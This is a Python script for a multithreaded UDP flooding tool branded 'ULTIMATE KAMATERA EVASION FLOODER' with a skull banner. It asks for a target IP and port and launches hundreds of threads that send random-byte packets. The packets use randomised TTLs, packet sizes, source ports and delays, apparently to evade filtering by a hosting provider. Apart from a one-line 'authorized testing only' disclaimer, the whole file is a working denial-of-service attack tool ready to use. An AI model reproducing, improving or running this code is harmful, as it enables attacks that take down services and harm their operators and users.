import socket
import random
import time
import threading
from sys import stdout

class UltimateFlooder:
    def __init__(self):
        self.skull = r"""
          _______
         /       \
        |  RIP   |
        |        |
        |        |
   _____|________|_____
  /  %%%%       %%%%  \
 /  %%%%         %%%%  \
|_______________________|
        DEATH LINK
"""
        self.evasion_params = {
            'ttl_values': [32, 64, 128, 255],
            'packet_sizes': [600, 1200, 1400],
            'delay_patterns': [0.001, 0.005, 0.01],
            'source_ports': range(50000, 60000)
        }
        self.stats = {'sent': 0, 'start': 0}

    def show_banner(self):
        orange = "\033[38;5;208m"
        red = "\033[31m"
        print(f"{red}{self.skull}{orange}")
        print("ULTIMATE KAMATERA EVASION FLOODER")
        print("► 2GB/s Capacity ► Multi-TTL ► Packet Variation")
        print("► WARNING: For authorized testing only!\033[0m\n")

    def create_stealth_socket(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, random.choice(self.evasion_params['ttl_values']))
        sock.bind(('0.0.0.0', random.choice(self.evasion_params['source_ports'])))
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**20)  # 1MB buffer
        return sock

    def generate_chaos_payload(self):
        size = random.choice(self.evasion_params['packet_sizes'])
        return random.randbytes(size)

    def flood_thread(self, target_ip, target_port):
        sock = self.create_stealth_socket()
        while self.stats['start']:
            try:
                sock.sendto(self.generate_chaos_payload(), (target_ip, target_port))
                self.stats['sent'] += 1
                if random.random() < 0.3:  # Random delay
                    time.sleep(random.choice(self.evasion_params['delay_patterns']))
            except:
                pass

    def stats_display(self):
        while self.stats['start']:
            elapsed = time.time() - self.stats['start']
            mb_sent = (self.stats['sent'] * 1400) / (1024*1024)
            speed = mb_sent / elapsed if elapsed > 0 else 0
            stdout.write(f"\r[☠] Sending: {speed:.1f} MB/s | Total: {mb_sent:.1f} MB")
            stdout.flush()
            time.sleep(0.5)

    def launch_attack(self, ip, port, threads=500):
        self.stats['start'] = time.time()
        print(f"[!] Initializing {threads} chaos threads...")
        
        for _ in range(threads):
            threading.Thread(target=self.flood_thread, args=(ip, port), daemon=True).start()
        
        threading.Thread(target=self.stats_display, daemon=True).start()
        
        try:
            while True: time.sleep(1)
        except KeyboardInterrupt:
            self.stats['start'] = 0
            elapsed = time.time() - self.stats['start']
            print(f"\n[!] Attack terminated after {elapsed:.1f} seconds")

if __name__ == "__main__":
    tool = UltimateFlooder()
    tool.show_banner()
    
    try:
        target = input("Target IP: ")
        port = int(input("Target Port: "))
        threads = int(input("Threads [500]: ") or 500)
        
        print("\n[!] Press CTRL+C to stop the attack\n")
        time.sleep(2)
        tool.launch_attack(target, port, threads)
        
    except Exception as e:
        print(f"[X] Error: {str(e)}")